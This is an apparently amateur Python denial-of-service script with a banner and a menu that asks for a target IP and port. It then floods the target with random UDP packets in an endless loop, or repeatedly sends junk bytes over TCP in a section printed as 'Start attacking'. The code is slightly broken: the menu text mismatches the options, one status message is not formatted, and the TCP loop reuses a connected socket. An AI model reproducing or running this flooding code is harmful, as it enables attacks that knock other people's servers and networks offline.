import socket
import random
import sys
import time
import cmd
import os
os.system('chcp 65001')
print("+==================================================================+")
print("|    ███████              █████      ███   █████              ████ |")
print("|  ███░░░░░███           ░░███      ░░░   ░░███              ░░███ |")
print("| ███     ░░███ ████████  ░███████  ████  ███████    ██████   ░███ |")
print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
print("|░░███     ███  ░███      ░███ ░███ ░███   ░███ ███ ███░░███  ░███ |")
print("| ░░░███████░   █████     ████████  █████  ░░█████ ░░████████ █████|")
print("|   ░░░░░░░    ░░░░░     ░░░░░░░░  ░░░░░    ░░░░░   ░░░░░░░░ ░░░░░ |")
print("+==================================================================+")
print("tst")


def choice_prompt():
    print("Select an option:")
    print("Flood UDP")
    print("Exit")

choice = input("-->")

if choice == "1":
 #def udp_flood(target_ip, ipport):
  target_ip = input("put in ip --> ")
  ipport = int(input("now put in ip port --> "))
  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  packet = os.urandom(5024)
  client.sendto(packet, (target_ip, ipport))
  print("Targeting {target_ip}:{ipport} with UDP packet")
  try:
   while True:
       client.sendto(packet, (target_ip, ipport))
       print(f"Packet sent to {target_ip}:{ipport}")
  except KeyboardInterrupt:
   client.close()
   sys.exit()
elif choice == "2":
 target_ip = input("IP --> ")
 ipport = int(input("IP PORT --> "))

 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print(f"Start attacking on {target_ip}{ipport}")
 
 try:
    while True:
        client.connect((target_ip,ipport))
        client.send(b"\x10" * 1024)
        print(f"sending attack {target_ip}:{ipport}")
 except socket.error:
       print("ERROR")


#elif choice == "2":
   #print("Exiting")
#exit    
 

#if __name__=="__main__":
 
  #if len(sys.argv) !=3:
   #print(" text <ip> <port>")

   #target_ip = sys.argv[1]
   #ipport = int(sys.argv[2])
   
   #while True:
    #udp_flood(target_ip, ipport)
 #try:
  #while True:
      #client.sendto(packet, (target_ip, ipport))
      #print(f"Packet sent to {target_ip}:{ipport}")
#except KeyboardInterrupt:
 #client.close()
 #sys.exit()
